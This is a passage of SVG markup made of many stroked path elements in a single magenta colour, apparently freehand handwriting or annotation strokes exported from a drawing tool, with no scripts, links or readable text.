stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M541.18 1723.96 L540.80 1724.85 L540.27 1726.39 L540.00 1727.82 L539.74 1728.95 L539.52 1729.96 L539.36 1730.91 L539.20 1731.86 L539.10 1732.99 L538.35 1732.51 L538.19 1731.62 L538.30 1730.31 L538.88 1729.72 L539.84 1729.54 L541.02 1729.42 L542.24 1729.54 L543.31 1729.54 L544.43 1729.66 L545.44 1729.90 L546.08 1730.55 L546.30 1731.38 L546.46 1732.51 L546.62 1736.01 L546.62 1738.27 L546.62 1740.17 L546.51 1741.78 L546.51 1743.20 L546.51 1744.45 L546.51 1745.88 L546.62 1747.12 L546.94 1746.41 L547.04 1744.63 L546.88 1741.72 L546.88 1738.63 L546.88 1735.66 L546.94 1733.10 L547.26 1730.79 L547.63 1728.95 L547.90 1728.11 L548.32 1726.87 L548.91 1725.92 L549.50 1725.38 L550.35 1725.03 L551.42 1725.26 L552.11 1725.86 L552.64 1726.75 L552.96 1727.70 L553.07 1728.89 L552.64 1731.50 L551.42 1734.41 L550.46 1735.96 L550.03 1736.61 L549.18 1737.62 L548.48 1738.21 L547.68 1738.57 L547.68 1738.57" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M556.86 1729.36 L556.64 1730.37 L556.48 1731.38 L556.27 1732.45 L556.16 1733.52 L556.22 1734.53 L556.43 1735.48 L557.02 1736.19 L557.02 1736.19" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M562.35 1726.45 L561.92 1727.16 L561.71 1728.00 L561.60 1729.01 L561.60 1730.31 L561.66 1731.32 L561.92 1732.21 L562.30 1733.04 L562.30 1733.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M573.50 1723.01 L573.18 1723.78 L572.86 1724.73 L572.54 1725.68 L572.11 1727.34 L571.79 1728.89 L571.42 1730.25 L571.20 1731.38 L570.88 1732.39 L570.67 1733.34 L570.35 1734.47 L569.98 1735.48 L569.98 1735.48" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M568.59 1734.77 L568.54 1733.70 L568.91 1732.75 L569.71 1732.21 L571.04 1731.86 L573.18 1731.38 L575.79 1730.79 L577.12 1730.61 L577.12 1730.61" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M540.59 1688.67 L540.22 1689.68 L539.84 1692.83 L539.79 1693.90 L539.58 1696.04 L539.42 1697.82 L539.36 1699.42 L539.36 1700.79 L539.42 1701.98 L539.52 1703.46 L539.58 1704.59 L539.58 1704.59" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M539.42 1691.23 L540.86 1690.10 L542.30 1689.27 L543.58 1688.67 L544.86 1688.38 L546.03 1688.32 L547.10 1688.32 L547.10 1688.32" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M547.63 1696.22 L548.75 1696.16 L549.76 1695.98 L550.67 1695.86 L551.79 1695.74 L552.32 1696.28 L551.90 1697.29 L551.31 1698.77 L550.67 1700.37 L550.24 1701.74 L550.03 1702.87 L550.03 1704.24 L550.56 1705.07 L551.47 1705.42 L552.54 1705.42 L554.83 1704.35 L555.90 1703.17 L556.43 1701.92 L556.59 1700.67 L556.43 1699.54 L555.84 1697.82 L555.26 1697.05 L555.26 1697.05" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M562.08 1696.16 L561.60 1696.75 L561.23 1697.70 L561.02 1698.77 L560.86 1699.84 L560.75 1701.09 L560.64 1702.22 L560.48 1703.28 L560.43 1704.53 L560.38 1705.60 L560.59 1704.71 L560.96 1703.82 L561.44 1702.87 L561.92 1701.98 L562.51 1701.27 L563.15 1700.67 L564.11 1700.79 L564.54 1701.44 L564.80 1702.22 L565.02 1703.34 L565.18 1704.35 L565.34 1705.36 L565.60 1704.59 L566.62 1702.22 L567.42 1700.55 L568.32 1699.07 L568.80 1698.47 L569.71 1697.58 L570.46 1696.93 L571.20 1696.57 L572.11 1696.34 L572.91 1696.69 L573.34 1697.58 L573.55 1698.59 L573.71 1699.48 L573.87 1700.43 L573.87 1700.43" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M582.51 1697.94 L581.50 1698.00 L580.59 1698.24 L579.63 1698.65 L578.94 1699.13 L578.35 1699.78 L578.08 1700.55 L578.51 1701.21 L579.36 1701.44 L580.38 1701.15 L581.02 1700.67 L581.60 1700.02 L582.14 1699.48 L582.08 1700.55 L582.30 1701.56 L582.30 1701.56" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M594.78 1692.53 L594.40 1693.31 L594.08 1694.14 L593.76 1694.97 L593.50 1695.86 L593.18 1697.29 L592.91 1698.83 L592.70 1701.38 L592.54 1702.63 L592.48 1703.70 L592.48 1703.70" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M589.39 1700.26 L588.59 1699.66 L588.11 1699.01 L588.75 1698.59 L589.82 1698.41 L591.47 1698.41 L593.87 1698.35 L596.22 1698.30 L596.22 1698.30" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M570.14 1918.61 L570.88 1918.32 L571.10 1917.49 L570.83 1916.71 L570.19 1917.13 L569.55 1917.60 L568.48 1919.21 L567.63 1920.75 L567.04 1922.18 L566.67 1923.43 L566.46 1924.55 L566.40 1925.92 L566.62 1926.87 L567.20 1927.52 L568.27 1927.23 L569.82 1925.62 L571.04 1923.90 L572.06 1921.94 L572.86 1919.86 L573.50 1917.90 L573.76 1917.13 L574.40 1914.87 L574.78 1913.80 L574.83 1914.99 L574.78 1916.18 L574.83 1917.43 L574.99 1918.55 L575.20 1919.50 L575.63 1920.10 L576.70 1919.92 L577.28 1919.21 L577.71 1918.38 L578.08 1917.49 L578.35 1916.71 L578.56 1917.54 L578.78 1918.61 L579.20 1919.56 L579.58 1920.34 L580.00 1921.11 L580.43 1921.94 L580.86 1922.71 L581.28 1923.48 L581.71 1924.26 L582.24 1924.91 L582.72 1925.80 L583.26 1926.57 L583.74 1927.35 L584.54 1927.88 L584.54 1927.88" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M592.43 1920.10 L592.06 1919.39 L590.99 1919.62 L590.46 1920.46 L590.24 1921.35 L590.14 1922.42 L590.19 1923.48 L590.35 1924.49 L590.67 1925.27 L591.31 1925.86 L593.39 1925.50 L595.20 1924.20 L596.86 1922.53 L598.35 1920.63 L599.58 1918.50 L600.59 1916.42 L601.39 1914.46 L601.82 1913.09 L602.08 1912.02 L602.14 1910.89 L601.87 1910.12 L601.07 1910.36 L600.54 1911.43 L599.63 1913.33 L598.88 1915.41 L598.30 1917.60 L597.55 1920.75 L597.44 1921.70 L597.28 1923.13 L597.23 1924.38 L597.34 1925.56 L597.76 1926.34 L598.67 1926.69 L599.42 1926.45 L600.22 1926.16 L601.18 1925.86 L602.03 1926.16 L602.67 1926.63 L603.31 1927.05 L604.32 1927.23 L605.18 1926.93 L605.87 1926.45 L606.46 1925.74 L607.04 1925.15 L607.52 1924.55 L608.16 1924.97 L608.59 1925.74 L608.59 1925.74" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M611.04 1916.53 L611.04 1916.53" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M619.84 1912.26 L619.20 1913.03 L618.88 1914.16 L618.67 1915.70 L618.30 1917.66 L617.98 1919.86 L617.87 1920.75 L617.76 1922.42 L617.55 1924.97 L617.44 1925.92 L617.34 1927.05 L617.23 1928.24 L616.86 1928.95 L616.27 1928.30 L616.06 1927.35 L616.16 1926.34 L616.64 1925.50 L617.28 1924.91 L618.08 1924.44 L620.43 1923.48 L621.71 1923.07 L622.83 1922.65 L623.74 1922.30 L624.43 1921.94 L625.18 1921.47 L625.98 1920.81 L626.62 1920.10 L626.94 1919.33 L627.20 1918.50 L627.04 1917.31 L626.67 1916.59 L625.55 1916.83 L625.02 1917.49 L624.64 1918.50 L624.22 1920.34 L624.00 1921.82 L623.95 1923.19 L624.11 1924.44 L624.32 1925.33 L624.64 1926.22 L625.44 1927.29 L625.98 1927.94 L627.04 1928.71 L627.04 1928.71" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M638.51 1921.41 L637.92 1920.69 L637.12 1920.34 L636.22 1920.63 L635.68 1921.29 L635.20 1922.18 L634.62 1924.08 L634.14 1925.86 L633.76 1927.29 L633.50 1928.53 L633.34 1929.48 L633.34 1930.73 L633.87 1931.50 L636.59 1930.20 L638.78 1928.00 L641.18 1924.85 L643.79 1920.99 L646.08 1916.89 L647.84 1913.09 L649.71 1908.52 L650.46 1906.32 L650.83 1905.31 L651.20 1903.94 L651.04 1902.75 L650.35 1903.41 L649.60 1904.60 L648.70 1906.38 L647.84 1908.46 L646.67 1911.90 L646.08 1914.34 L645.66 1916.71 L645.34 1918.97 L645.18 1921.29 L645.12 1922.30 L645.12 1924.02 L645.18 1925.33 L645.23 1926.45 L645.55 1927.64 L645.87 1928.42 L647.20 1928.30 L648.16 1927.29 L649.02 1926.16 L649.76 1925.15 L650.35 1924.26 L650.88 1923.37 L651.36 1922.65 L651.84 1922.00 L652.27 1922.71 L652.64 1923.54 L652.91 1924.38 L653.28 1925.09 L653.66 1925.86 L654.14 1926.45 L654.83 1926.99 L655.84 1927.05 L655.84 1927.05" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M660.32 1921.58 L660.16 1922.53 L659.95 1923.48 L659.79 1924.44 L659.79 1924.44" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M668.38 1911.37 L667.95 1912.20 L667.63 1913.33 L667.20 1915.41 L666.72 1917.60 L666.40 1920.04 L665.82 1923.72 L665.55 1926.10 L665.23 1928.24 L665.12 1929.13 L664.96 1930.73 L664.80 1931.92 L664.75 1933.23 L664.59 1934.18 L664.38 1933.17 L664.32 1931.92 L664.32 1930.73 L664.75 1928.59 L665.23 1926.69 L665.76 1925.33 L666.24 1924.26 L666.83 1923.48 L667.42 1922.77 L667.90 1922.18 L668.70 1921.64 L669.34 1921.23 L670.40 1921.29 L670.78 1922.00 L670.88 1923.07 L670.88 1924.14 L670.88 1925.27 L670.83 1926.45 L670.83 1927.58 L670.83 1928.77 L671.10 1929.60 L672.22 1929.42 L672.64 1928.77 L673.12 1927.88 L673.55 1927.05 L673.66 1928.18 L673.92 1929.13 L674.83 1929.37 L675.74 1928.95 L677.28 1927.23 L678.14 1925.80 L678.78 1924.55 L679.31 1923.66 L679.63 1922.89 L680.00 1922.18 L680.64 1922.65 L680.96 1923.66 L681.23 1924.44 L681.66 1925.21 L682.14 1925.86 L682.83 1926.45 L683.90 1926.63 L684.80 1926.45 L686.03 1925.62 L687.47 1923.90 L687.95 1922.89 L688.32 1922.12 L688.16 1921.05 L687.20 1921.47 L686.62 1922.30 L685.82 1923.78 L685.34 1925.09 L685.18 1926.22 L685.34 1927.23 L685.66 1928.06 L687.10 1929.72 L688.48 1930.73 L689.28 1931.21 L689.28 1931.21" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M546.72 3255.55 L546.19 3256.14 L544.64 3258.76 L543.47 3260.90 L542.35 3263.51 L540.96 3266.54 L539.84 3269.87 L538.83 3273.07 L538.46 3274.74 L538.03 3277.65 L537.87 3280.62 L538.19 3283.35 L538.99 3285.84 L541.34 3289.23 L543.68 3291.07 L546.72 3292.38 L550.14 3293.39 L552.11 3293.74 L556.16 3294.28 L560.11 3294.58 L563.90 3294.64 L567.36 3294.64 L570.51 3294.46 L573.28 3294.28 L575.74 3293.98 L578.24 3293.51 L579.31 3293.15 L580.06 3292.74 L580.06 3292.74" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M571.82 3278.18 L572.14 3277.64 L573.69 3278.82 L574.64 3280.06 L575.40 3281.69 L575.91 3284.95 L575.91 3286.14 L575.44 3288.96 L574.48 3291.97 L572.73 3295.39 L570.19 3298.89 L567.41 3302.11 L564.86 3304.68 L562.68 3306.26 L561.76 3306.61 L561.76 3306.61" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M614.99 3278.87 L613.60 3279.27 L612.88 3279.66 L611.49 3280.60 L609.62 3282.63 L608.71 3284.11 L608.07 3285.59 L607.87 3286.93 L607.99 3288.02 L608.47 3289.11 L609.42 3290.24 L610.02 3290.69 L611.41 3291.28 L613.44 3291.58 L614.59 3291.38 L616.10 3290.79 L617.33 3289.85 L618.17 3288.61 L618.57 3286.93 L618.49 3285.05 L618.13 3282.98 L617.61 3281.00 L617.29 3280.11 L616.70 3278.63 L616.42 3278.03 L615.98 3277.19 L615.98 3277.19" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M623.22 3276.35 L623.26 3277.24 L623.14 3278.87 L622.98 3280.80 L622.90 3282.88 L622.82 3285.05 L622.74 3287.33 L622.66 3288.46 L622.62 3290.74 L622.50 3292.86 L622.46 3294.84 L622.50 3295.73 L622.42 3297.11 L622.34 3298.15 L622.34 3299.29 L622.34 3299.29" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M628.78 3290.14 L628.82 3289.30 L628.35 3288.71 L627.59 3288.51 L626.80 3288.71 L625.28 3289.85 L624.85 3290.34 L624.21 3291.13 L623.85 3291.97 L623.62 3292.81 L623.73 3293.90 L624.33 3294.74 L625.56 3295.68 L627.15 3296.32 L629.02 3296.72 L631.01 3296.82 L631.01 3296.82" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M640.67 3296.97 L641.14 3296.57 L642.34 3295.34 L643.73 3293.70 L645.16 3291.78 L646.51 3289.65 L647.66 3287.33 L648.66 3284.75 L649.29 3282.14 L649.65 3279.71 L649.93 3277.49 L650.09 3275.66 L650.21 3274.32 L650.25 3273.34 L649.45 3274.08 L648.86 3276.05 L648.30 3278.53 L647.74 3281.39 L647.19 3284.26 L646.71 3287.18 L646.39 3289.80 L646.07 3292.27 L645.91 3294.54 L645.91 3296.52 L645.95 3298.00 L646.11 3299.09 L646.39 3299.88 L646.99 3300.28 L647.98 3299.64 L648.90 3298.25 L649.37 3297.46 L650.68 3294.99 L651.40 3293.55 L651.72 3292.96 L652.24 3291.92 L652.59 3291.23 L652.95 3290.64 L653.23 3291.28 L653.27 3292.12 L653.39 3293.01 L653.51 3293.90 L653.71 3294.79 L654.02 3295.53 L654.62 3295.93 L655.57 3295.88 L656.93 3294.89 L657.40 3294.30 L658.20 3293.11 L658.75 3292.17 L659.11 3291.53 L659.43 3290.84 L659.11 3291.53 L658.91 3292.37 L658.67 3294.00 L658.60 3295.44 L658.67 3296.62 L658.91 3297.66 L659.27 3298.45 L659.91 3299.34 L660.78 3299.98 L661.58 3300.23 L662.41 3300.18 L664.08 3299.29 L664.60 3298.75 L665.63 3297.36 L666.70 3294.84 L667.14 3293.21 L667.30 3292.47 L667.46 3291.33 L667.38 3290.24 L666.98 3289.65 L666.15 3289.75 L665.59 3290.24 L665.15 3290.84 L664.40 3292.17 L664.12 3292.76 L663.64 3294.99 L663.72 3295.83 L663.92 3296.52 L664.20 3297.11 L664.60 3297.56 L665.31 3297.91 L666.27 3297.86 L667.18 3297.36 L668.41 3296.42 L669.41 3295.24 L670.64 3293.31 L671.35 3292.12 L671.83 3291.13 L672.11 3290.49 L672.35 3289.75 L671.71 3290.14 L671.39 3291.13 L670.88 3293.06 L670.72 3294.20 L670.72 3295.14 L670.80 3296.03 L671.08 3296.77 L671.43 3297.31 L672.27 3297.95 L673.14 3298.35 L674.06 3298.45 L674.81 3298.20 L676.52 3296.42 L677.24 3294.89 L677.87 3293.41 L678.19 3292.27 L678.47 3291.53 L678.67 3290.69 L678.39 3291.38 L678.39 3292.37 L678.55 3293.11 L678.79 3294.00 L679.15 3294.79 L679.46 3295.44 L679.82 3295.98 L679.82 3295.98" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M668.25 3283.42 L668.02 3282.53 L668.37 3281.59 L668.69 3281.10 L669.17 3280.40 L669.57 3279.96 L670.08 3279.56 L670.72 3279.81 L671.08 3280.31 L671.08 3280.31" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M677.32 3270.17 L677.71 3269.43 L678.23 3268.94 L678.83 3268.54 L680.06 3267.99 L681.13 3267.85 L681.93 3267.80 L682.60 3268.19 L682.37 3270.17 L681.17 3272.05 L680.34 3273.14 L680.34 3273.14" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M698.35 3285.45 L698.03 3284.85 L698.23 3285.50 L698.70 3287.47 L698.98 3289.20 L699.22 3290.84 L699.38 3292.22 L699.50 3293.31 L699.62 3294.15 L699.78 3295.09 L700.57 3293.01 L701.05 3290.79 L701.60 3288.61 L701.96 3287.57 L702.72 3285.69 L703.39 3284.11 L703.71 3283.57 L704.27 3282.73 L704.86 3282.24 L705.38 3282.58 L705.58 3283.42 L705.82 3285.50 L705.86 3287.33 L705.90 3288.17 L706.02 3289.60 L706.14 3290.79 L706.30 3291.78 L706.49 3292.52 L706.81 3293.21 L707.21 3293.70 L707.69 3294.10 L708.52 3294.30 L709.71 3294.25 L711.38 3293.70 L712.22 3293.31 L713.97 3291.97 L715.68 3290.14 L717.15 3287.77 L718.38 3285.05 L719.17 3282.04 L719.81 3279.07 L720.13 3276.45 L720.17 3274.18 L719.85 3271.41 L719.41 3269.97 L718.90 3269.08 L718.26 3268.64 L717.54 3268.49 L716.23 3269.23 L715.04 3270.52 L713.97 3272.25 L713.09 3274.57 L712.42 3276.94 L712.10 3279.47 L711.94 3283.12 L712.22 3285.35 L712.42 3286.39 L712.97 3288.41 L713.65 3290.09 L714.44 3291.53 L715.36 3292.57 L716.19 3293.26 L716.87 3293.41 L717.47 3293.21 L717.94 3292.67 L718.94 3290.94 L719.37 3289.94 L719.69 3289.11 L719.97 3288.46 L720.17 3287.82 L720.45 3287.18 L720.65 3287.92 L720.80 3288.71 L721.24 3290.04 L721.52 3290.69 L722.00 3291.78 L722.47 3292.57 L723.03 3293.26 L723.51 3293.65 L724.22 3293.85 L724.82 3293.55 L726.17 3291.53 L726.77 3290.19 L727.16 3289.25 L727.48 3288.51 L727.76 3287.77 L727.64 3288.66 L727.64 3289.60 L727.84 3290.34 L728.16 3290.99 L728.56 3291.53 L729.27 3291.78 L729.87 3291.53 L731.02 3290.39 L731.42 3289.90 L731.97 3289.01 L732.37 3288.31 L732.81 3287.52 L732.89 3288.46 L733.13 3289.25 L733.76 3290.39 L734.56 3291.48 L735.03 3291.83 L735.95 3292.27 L736.74 3292.47 L737.54 3292.47 L738.49 3292.27 L739.25 3291.87 L739.73 3291.33 L740.12 3290.74 L739.84 3290.14 L738.97 3290.14 L737.86 3290.94 L737.42 3291.33 L736.78 3292.17 L736.47 3292.96 L736.39 3293.90 L736.62 3294.54 L737.18 3294.84 L738.02 3294.74 L739.25 3293.95 L740.28 3292.86 L741.12 3291.58 L741.83 3290.09 L742.23 3288.51 L742.47 3287.28 L742.63 3286.39 L742.63 3285.50 L743.10 3287.03 L743.86 3288.66 L744.65 3290.39 L745.41 3292.27 L745.73 3293.31 L746.24 3295.34 L746.64 3298.35 L746.56 3300.28 L746.32 3302.11 L746.01 3303.84 L745.41 3305.42 L744.46 3306.66 L743.22 3307.50 L741.71 3307.59 L739.88 3307.00 L737.94 3305.67 L736.90 3304.78 L735.03 3302.90 L733.44 3300.82 L733.44 3300.82" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M736.58 3271.85 L737.34 3271.55 L738.25 3271.55 L738.97 3271.95 L739.33 3272.54 L739.80 3273.58 L740.16 3275.11 L740.28 3275.91 L740.36 3276.79 L740.20 3279.66 L740.00 3280.70 L740.00 3280.70" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M766.56 3281.24 L765.80 3281.49 L765.60 3282.28 L765.48 3283.12 L765.44 3284.06 L765.44 3285.20 L765.36 3286.64 L765.36 3288.17 L765.36 3289.30 L765.36 3290.24 L765.44 3291.13 L765.76 3288.71 L766.04 3286.44 L766.44 3284.31 L766.72 3283.22 L767.35 3281.29 L768.11 3279.66 L768.90 3278.28 L769.66 3277.19 L770.29 3276.60 L770.85 3276.30 L771.49 3276.50 L771.96 3277.14 L772.40 3278.67 L772.56 3279.42 L772.76 3280.80 L772.80 3282.09 L772.88 3283.27 L772.80 3284.36 L772.76 3285.30 L772.72 3286.39 L772.64 3287.23 L773.39 3286.09 L774.27 3284.85 L775.06 3283.72 L776.06 3282.43 L776.53 3281.94 L777.09 3281.49 L777.53 3281.99 L777.53 3283.12 L777.41 3284.06 L777.37 3285.00 L777.29 3285.89 L777.37 3286.88 L778.08 3286.93 L779.00 3285.54 L779.75 3284.16 L780.07 3283.52 L780.63 3282.53 L780.99 3281.84 L781.30 3281.24 L781.26 3282.09 L781.03 3282.98 L780.95 3283.87 L781.03 3284.85 L781.30 3285.54 L781.82 3286.04 L782.66 3286.04 L784.21 3285.50 L785.84 3284.26 L787.62 3282.43 L788.50 3281.29 L790.45 3278.53 L792.00 3275.61 L793.23 3272.89 L794.14 3270.47 L794.70 3268.54 L794.94 3267.70 L794.82 3265.67 L794.30 3265.33 L793.47 3265.33 L791.76 3265.87 L790.76 3266.41 L788.78 3267.80 L786.91 3269.63 L785.36 3271.75 L784.36 3273.98 L783.93 3276.05 L784.09 3278.08 L784.56 3279.96 L785.76 3282.53 L786.59 3283.96 L787.35 3285.35 L787.70 3285.99 L787.98 3286.59 L788.42 3287.57 L788.62 3288.51 L788.66 3289.35 L788.62 3290.19 L788.10 3291.63 L787.23 3292.67 L786.27 3293.21 L784.36 3293.01 L784.36 3293.01" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M779.55 3268.74 L780.07 3268.44 L781.03 3268.09 L782.89 3268.39 L784.56 3269.23 L786.27 3270.52 L787.19 3271.36 L787.19 3271.36" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M811.71 3275.46 L811.39 3274.62 L811.08 3273.98 L810.80 3274.62 L810.64 3275.51 L810.48 3277.54 L810.16 3279.66 L809.84 3281.79 L809.29 3284.01 L808.61 3286.34 L807.86 3288.36 L807.10 3290.19 L806.47 3291.78 L806.15 3292.47 L805.83 3293.36 L805.83 3293.36" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M814.97 3280.80 L815.05 3279.96 L814.26 3279.96 L813.74 3280.80 L812.87 3282.24 L812.51 3283.03 L811.91 3284.66 L811.47 3286.34 L811.39 3287.08 L811.43 3288.41 L812.15 3290.04 L813.26 3290.84 L815.57 3291.23 L817.44 3290.69 L818.39 3290.24 L820.38 3289.11 L821.93 3287.92 L823.20 3286.59 L824.04 3285.35 L824.47 3284.36 L824.27 3283.52 L823.36 3283.82 L821.85 3285.99 L821.53 3286.68 L821.25 3287.87 L821.17 3288.96 L821.37 3289.75 L821.73 3290.34 L822.25 3290.74 L823.04 3291.04 L823.96 3290.94 L825.55 3290.14 L826.54 3289.30 L827.14 3288.12 L827.37 3287.03 L827.22 3286.04 L826.78 3285.30 L825.55 3284.71 L824.19 3284.61 L822.13 3285.45 L822.13 3285.45" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M841.60 3271.26 L841.05 3271.75 L840.93 3272.54 L840.77 3274.62 L840.65 3277.04 L840.61 3279.51 L840.61 3280.85 L840.73 3283.42 L840.73 3285.89 L840.81 3289.25 L840.81 3290.24 L840.89 3291.83 L840.97 3293.01 L841.05 3293.90 L841.21 3294.59 L841.56 3293.95 L842.04 3292.17 L842.60 3290.04 L843.59 3286.93 L844.39 3285.20 L845.30 3284.01 L845.74 3283.57 L846.41 3283.27 L847.09 3283.62 L847.33 3284.61 L847.25 3286.78 L846.77 3288.66 L846.33 3290.39 L845.54 3292.67 L845.26 3293.31 L844.78 3294.25 L844.31 3294.99 L843.83 3295.39 L843.08 3295.44 L842.60 3294.99 L842.60 3294.99" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M851.66 3283.57 L851.50 3284.31 L851.22 3284.90 L850.67 3286.68 L850.35 3288.17 L850.23 3289.35 L850.27 3290.39 L850.51 3291.13 L850.87 3291.78 L851.38 3292.12 L852.38 3292.17 L853.49 3291.92 L855.00 3291.13 L856.31 3290.04 L857.86 3287.87 L858.34 3287.03 L858.78 3285.35 L859.06 3284.61 L859.21 3283.32 L859.21 3282.43 L858.82 3281.69 L857.86 3281.69 L857.19 3282.43 L856.63 3283.03 L855.72 3284.56 L854.76 3287.08 L854.44 3288.91 L854.32 3289.75 L854.40 3291.08 L854.92 3292.81 L855.24 3293.36 L855.99 3294.10 L856.87 3294.44 L857.74 3294.30 L859.37 3293.65 L859.37 3293.65" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M868.71 3281.44 L868.36 3280.95 L867.76 3281.44 L866.41 3283.57 L865.81 3285.00 L865.34 3286.59 L865.14 3287.33 L864.94 3288.02 L864.66 3289.11 L864.50 3290.04 L864.38 3290.94 L864.38 3290.94" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M863.94 3286.04 L863.90 3285.05 L864.22 3284.46 L864.94 3284.66 L865.65 3284.90 L866.49 3285.05 L867.20 3285.30 L867.20 3285.30" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M856.91 3274.87 L856.43 3274.52 L855.72 3273.93 L855.20 3273.44 L855.52 3272.74 L857.58 3272.69 L858.66 3272.74 L860.96 3272.84 L863.27 3272.99 L863.27 3272.99" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M883.34 3259.59 L882.83 3259.89 L882.07 3261.62 L881.00 3264.24 L879.84 3267.55 L879.84 3267.55" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M891.49 3281.99 L890.89 3281.49 L890.18 3281.24 L889.34 3281.24 L888.47 3281.44 L887.32 3282.28 L886.12 3283.42 L885.65 3284.06 L884.85 3285.50 L884.14 3286.98 L883.94 3287.72 L883.74 3288.81 L883.74 3289.80 L883.98 3290.44 L884.38 3290.94 L885.13 3291.13 L886.68 3290.54 L887.79 3289.60 L888.87 3288.36 L889.66 3286.93 L890.30 3285.45 L890.58 3284.85 L890.97 3283.87 L891.25 3283.17 L891.53 3282.58 L891.25 3283.27 L890.97 3284.46 L890.62 3286.29 L890.34 3288.07 L890.26 3288.81 L890.30 3290.24 L890.46 3291.33 L890.78 3292.17 L891.17 3292.71 L891.17 3292.71" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
